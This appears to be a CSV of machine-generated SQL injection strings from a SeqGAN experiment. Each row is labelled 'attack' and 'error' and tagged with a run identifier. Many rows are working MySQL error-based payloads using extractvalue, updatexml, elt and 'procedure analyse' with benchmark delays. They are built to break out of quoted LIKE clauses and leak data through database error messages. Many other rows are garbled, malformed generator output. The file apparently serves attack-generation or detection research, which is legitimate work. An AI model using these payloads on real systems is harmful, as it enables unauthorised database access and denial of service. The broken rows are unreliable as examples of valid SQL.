attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,862
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,863
attack,"1%""   )    )     (  extractvalue  (  (  (  (  (  (  3393,concat  (  (  (  (  (  (  (  0x2e,(  =  (  (  (  9627,concat  (  (  (  0x2e,1   )    (  extractvalue  (  (  2917,concat  (  (  (  (  (  (  2518  (  8862,1   (  extractvalue  (  (  (  (  (  7982,concat  (  3393,concat  (  (  (  0x5c,0x7171706a71,  (  select   (  elt  (  elt  (  1049  =  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,864
attack,"1%""   )    (    2162   )    AND 6800  )  1 extractvalue  (  (  (  (  (  (  (  (  (  0x5c,0x7171706a71,  (  0x2e,0x7171706a71,  (  select   (  case when   (  (  elt  elt    (  8862  (  (  select   (  case 5322 0 0 from dut  )  el  elt  (  7982  =  (  (  select   (  elt  e  )  0x2e,md5  (  9788(  =  (  (  1808,concat  (  0x5c,  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,865
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,866
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,867
attack,"1"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""ekjh",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,868
attack,"1%""  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,869
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,870
attack,1%%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,871
attack,"1%%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,872
attack,"1% where extractvalue  (  3393,concat  (  (  (  (  (  0x2e,0x7171706a71(  (  benchmark  (  5000000(  (  0x5c,0x7171706a71,  (  selecte  (  (  elt  (  0x5c,  (  select   (  elt  (  elt  (  3393  =  (  (  0x5c,  (  (  select   (  elt  (  elt  (  0x2e,0x7171706a71,  (  (  benchmark  (  (  benchmark  (  5000000(  (  7982,concat  (  0x5c,md5  (  (  select   (  el  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,873
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  ""'  =  'kthen4774 and extractvalue  (  (  (  3393,1   )    )Sd5  extractvalue  (  (  (  0x5c,  (  select   (  e  (  elt  (  5000000,md5  (  (  (  select   (  )  elt  (   SELECT a  (  )  elt  (  (  1297  =  3393,md5  =  (  9788,1   (  case 0 from d 0 0 from dual  )  )  e  )   SELECT d ual  )   from d5  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,874
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,875
attack,"1%""   )    AND 'i'  =  1  )  from   (  (  (  (  (  5000000(  7982,1   (  1724  =  'inaddutancee  )  elt  (  elt  (  elt  (  3393  =  (  0x5c=  (  0x5c,0x7171706a71,  (  benchmark  (  (  select   (  6461   (  4774  (  1297  =  3393,  (  (  (  select   (  e  (   (  5322  (  (  elt  (  e  l  )  q  =  3393,  select",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,876
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,877
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,878
attack,"1"" and updatexml  (  (  (  (  benchmark  (  (  (  8862,concat,0x7171706a71(  (  9627,concat  (  0x5c,0x7171706a71,  (  (  select   (  elt  (  elt  (  0x5c,  (  select   (  case 3539 9490   (  1724  (  case when   (  (  el  (  7982,concat  (  0x5c,  (  benchmark  (  5000000,m(  (  (  (  (  benchmark  (  (  5000000(  (  3393,concat  (  (  (  3393  (  (  select   (  elt  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,879
attack,"  )  (  select   (  =  (  6166  =  3393,0x7171706a71,  (  benchmark  (  (  benchmark  (  (  (  =  6212  )   (  (  e  (  elt  (    (  0x2e,0x7171706a71,  (  (  benchmark  (  (  benchmark  (  (  2917  =  (  (  1049  =  (  1808,md5  (  (  select   (  elt  (  elt0x2e  =  3393,  (  =  (  (  a  7636  )  (  0x2e,0x7171706a71,  (  select   (  e  ut  )  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,880
attack,"1%7151%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,881
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,882
attack,"1"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""yghngnetnamamcysmonane  (  0x2e,0x7171706a71,  (  (  2917,  (  (  =  (  3393,concat  (  0x2e,md5  (  (  benchmark  (  (  (  0x2e,md5  (  (  0x5c,  (  select   (  (   (  8868  (  elt  (  e  (  1808  =  (  0x2e,0x7171706a71,  (  5000000,md5  (  (  7982  =  (  concat  (  0x5c,0x7171706a71,  (  (  =  (  1808,concat  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,883
attack,1%%'  =  '1%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,884
attack,"1' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'kh' like 'kunnselect0x717a767a71   (  (  eladnt  (  4415  )  0x2e,0x7171706a71,  (  select   (  5777  (  elt  (  0x2e,0x7171706a71,  (  benchmark  (  benchmark  (  5000000,md5  (  0x2e,0x7171706a71,1   (  1535  )   (  3576  =  (  1297,concat  (  (  (  (  select   (   (   (  (  5603   (  1354  (   SELECT d duan abanal  )  e  )  )   from dual  )   end  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,885
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,886
attack,"1%%"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and ""k'  =  'ktheni",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,887
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,888
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,889
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,890
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,891
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,892
attack,"1%""   )    )     extractvalue  (  (  5883lt  (  0x4b774c75   )    (    (  5000000,md5  (  1808,1   )    AND 1559  =  4102  =  8083  )  select *,md5  (  1 ast  (  el  select,6166  (  (  (  0x2e,  (  (  9255,concat  (  benchmark  (  (  5000000,md5  (  5000000(  0x2e,0x7171706a71,  (  select   (  5777   (  elt  (  0x5c,0x7171706a71,  (  (  (  select   (  elt  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,893
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,894
attack,"1%"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""'  =  'qc'  =  'qcsi",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,895
attack,"1 and extractvalue  (  (  1759(  (  (  (  (  (  0x5c,0x7171706a71,  (  select   (  e  )  0x4b774c75   )    AND 'i'  =  1 else as d 9103 3863=  5433  (  (   (  5433  (  (  3393,1   )    AND 'i'  (  1 as anal  (  e  3393  (  =  (  (  3393  =  (  (  0x5c,0x7171706a71,  (  (  5000000,mduan  (  0x5c,  (  (  select   (  elt  (  1808  =  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,896
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,897
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,898
attack,"0x5cAND 4688  (  1 updatexml  (  (  (  (  (  (  (  (  0x5c,concat  (  (  0x2e,md5  (  (  0x2e,0x7171706a71,  (  select   (  (  elt  (  e  t  (  elt  (  e  (  0x2e,0x7171706a71,  (  (  0x5c,0x7171706a71,  (  benchmark  (  (  9627,concat  (  (  0x2e,0x7171706a71,  (  0x5c,  (  (  select   (   (  3863  (  (  7529  (  0x2e,0x7171706a71,  (  select   (  elt  (  (  e",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,899
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,900
attack,"select   (  (  elt  (  e(  5777  )  0x2e,0x7171706a71,  (  select   benchmark  (  3393,1   )    (  extractvalue  (  (  (  2917,concat  (  (  0x2e,  (  (  (  benchmark  (  (  (  5000000,md5  (  (  0x5c,0x7171706a71,  (  select   (  el  (  1808  =  (  =  (  7982,1   )    FROM 5464    (  select 0 from(  (  elt  (  6461  =  (  0x5c,  (  select   (  el  (  1808  =",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,901
attack,"1%""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,902
attack,"1' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ' bnh' like 'n""  =  ""emym",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,903
attack,1%'  =  'k,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,904
attack,"1%"" and extractvalue  (  (  (  (  (  (  (  (  (  3393,concatt  (  (  (  (  (  (  (    (  (  1759(  (  0x5c,0x7171706a71,  (  =  (  (  17590x7171706a71,  (  5000000(  (  1808,,  (  (  (  benchmark  (  (  5000000(  (  0x2e,0x7171706a71,  (  (  (  5000000(  (  (  0x2e,0x7171706a71,  (  (  (  (  1559,1  )  select   (  (  e  (   SELECT from   (  (  5603  )  8868",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,905
attack,"1%"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,906
attack,"  )  select   (  elt  (  1297  =  3393,concat  (  benchmark  (  9393  =  (  select   (  ele  (  benchmark  (  (  5000000(  (  select   (  elt  (  elt  (  0x5c,  (  (  select   (  elt  (  1808  =  (  0x2e,0x7171706a71,  (  select   (  elt  e  =  (  7982  =  (  (  (  0x2e,0x7171706a71,  (  select   (  elta  )  1808  =  (  =  (  0x2e,concat  (  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,907
attack,"1%""  )  )   from dual  )   end  (  3217  (  elt  (  1808  =  5847  (  0x5c,0x7171706a71,  (  select   (  7982,1   (  case * from 7997  (  (  select   (  elt  (  e  (  1808  =  (  0x2e,0x7171706a71,  (  (  select   (   (  (  (  elt  (  elt  (  (  e  (  0x2e,m5  (  (  (  benchmark  (  benchmark  (  (  9627,concat  (  (  (  0x2e,0x7171706a71,",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,908
attack,"1%""   )    (  extractvalue  (  (  (  (  benchmark  (0   (  5433  (  1808,concat  (  (  =  (   (  (  (  7982,1   )    (  extractvalue  (  (  9627,1   (  (  case when a  )  3576  =  (  7982,0x7171706a71,  (  (  benchmark  (  5000000(  (  0x2e,0x7171706a71(  (  5000000(  (  0x5c,  (  (  (  select   (  case when   (  (  e  (  (  elt  (  e  (  case when   (  4568  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,909
attack,"1%""   )    )     7757  9083  #l  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,910
attack,"1' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'kpk'  =  'k'  =  'ik'  =  'ciqkdure anal  )  )  )  (  elt  (  e  (  (  0x4b774c75   (  0 0 from dual  )  elt  )  3863 0 0 from dua  (  case when   (  (  elyse  (  elt  (  1808  =  1 when   (  (  1354  =  utl  )  1808,1   )    AND 'i'  (  select 0 from dual  )  5464  =  5433  )  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,911
attack,"1select   )    (  extractvalue  (  9836  )   (  (  and 0 0 from(  (  (  elt  )  3393,1   and extractvalue  (  (  (  1272  =  (  1808,md5  (  3393  (  6166  =  (  (  1808  =  (  (  (  0x5c,0x7171706a71,  (  5000000(  (  select   (  eltt  elt  (  7982  =  2917,m 0 0 froms(  (  (  case 9490  case 0 0 from dual  )  case when   (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,912
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,913
attack,"1 p0x717a767a71updatexmldu.7636nn_nat  (  3393  =  (  5989t  )  1297  =  (  3393,1   )    (  extractvalue  (  (  benchmark  (  5000000(  (  0x5c,0x7171706a71,  (  select   (  6581  =  (  0x5c,  (  (  select   (  elt  (  7982  =  (  1297,1   )    (  extractvalue  (  9627,md5  (  0x5c,md5  (  (  0x2e,0x7171706a71,  (  0x5c,md5  (  (  0x5c,0x7171706a71,  (  (  t  (  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,914
attack,"1"" or extractvalue  (  (  (  (  (  (  0x2e,0x7171706a71,  (  5000000(  (  (  0x5c,0x7171706a71,0x7171706a71,  (  (  5000000,md5  (  (  1808  =  (  (  (  select   (  3863  )   (  (  elta  elt  (  1808  =  (  3393,md5  =  (  7982,1   )    ual  )  0x4b774c75  )  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,915
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  '%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,916
attack,1%%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,917
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,918
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,919
attack,"1%%E' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'eiuc"" like ""ei nalynenal  (  0x5c,(  (  select   (  case when   (  5433  (  2518  (  (  elt  (  1808  =  3393,  (  benchmark  (  benchmark  (  (  1297,concat  (  (  (  2917=  (  (  0x2e,md5  (  (  benchmark  (  (  3393,  (  (  0x2e,0x7171706a71,  (  (  (  5000000(  (  (  1808,1   (  case ant  )  select 0 from d5  (  e",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,920
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ''  =  'k'  =  'nnpw",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,921
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and """" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""i quh' like '""  =  ""gehumhmwgehkubusancenal  )  el  )  1808  =  (  (  0x2e,0x7171706a71,  extractvalue  (  (  5000000,md5  (  (  0x2e,0x7171706a71,  (  select   (  elt  (  0x5c,  (  (  select   (  elt  1049=  2917,  (  (  benchmark  (  (  5000000(  (  (  0x2e,  (  (  5000000,md5  (  0x4b774c75   (  4774  (  (  elt  (  0x5c,0x7171706a71",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,922
attack,"1%""  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,923
attack,"1 where extractvalue  (  (  7529  (   ual  el  (  0x5c,0x7171706a71,  (  (    (  select   (lt  (  elt  (  0x2e,0x7171706a71,  (  benchmark  (  (  (  5000000,md5  (  (  0x2e,md5  (  0x5c,0x7171706a71,  (  (  9627,0x7171706a71,  (  (  5000000(  (  benchmark  (  (  (  3393,concat  (  (  extractvalue  (  5000000,md5  (  (  0x5c,0x7171706a71,  (  benchmark  (  9627,concat  (  (  (  (  0x5c,",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,924
attack,"1%"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,925
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,926
attack,"1%""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,927
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,928
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,929
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,930
attack,"1%""   )    procenaddre anal  )  )   end  (  (  (  elte  (  elt  (  benchmark  (  case   (  elt  (  0x2e,  (  5000000(  (  select   (  elt  (  1808  =  4125  (  (  5423  =  (  9788,md5  (  0x2e,0x717a767a71  (  select 0 else a du an d 0 0 d dua  el  case when   (  (  (  elt  elt  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,931
attack,"1'  )   from dual  )   end  (   (  4660  (  el  (  1808,concat  (  0x5c,0x7171706a71,  (  (  select   (  elt  (  e(  elt  (  0x2e,0x7171706a71,  (  benchmark  (  (  select   (  (  elt  (  7982  =  (  (  0x2e,0x7171706a71,  (  extractvalue  (  (  (  9627,concat  (  (  0x5c,0x7171706a71(    (  5000000,md5  (  (  (  0x5c,0x7171706a71,  (  (  benchmark  (  select   (  (  el",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,932
attack,"1%""   and extractvalue  (  1808,concat  (  (  (  0x5c,0x7171706a71,  (  select   (  elt  (  (  elt  (  0x5c,  (  5000000(  2917(  (  3393  =  (  (  (  0x5c,0x7171706a71,0x717a767a71  (  select   (  (  elt  (  )  1759  =  (  0x2e,md5  (  0x52515a50   )    (  1724  (  (  (  select   (  5322  =  (  elt  (  7982  =  3393,  (  select   (  elt  (  elt  (  1808",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,933
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,934
attack,"1% procceedure analyse    (    el  (  e  (  5000000(  (  (  0x2e,(  (  select   (  elt  (   (  extractvalue  (  (  benchmarkt  (   (  1802  (  1808,1   )    (  extractvalue  (  (  1297,1   )    (  select   (  4660  )  1 as duan dnad5704  )  el  )   end  (  (  elt  )  7982  =  3393,  (  (  select   (  elt  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,935
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,936
attack,"1%""   )    (  8860  =  9338  =  1 case 9490  (  elt  (  1808  =  3393,1   (  5322  =  (  7982,1   )    )    (  extractvalue  (  9627,concat  (  (  (  0x2e,md5  (  0x4b774c75   (  5603  (  elt  (  (  (  e  (  (  0x5c,  (  select   (  elt  (  e  (  3393  =  (  (  (  select   (  1808,l  (  1049  (  (  (  0x2e,md5  (  (  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,937
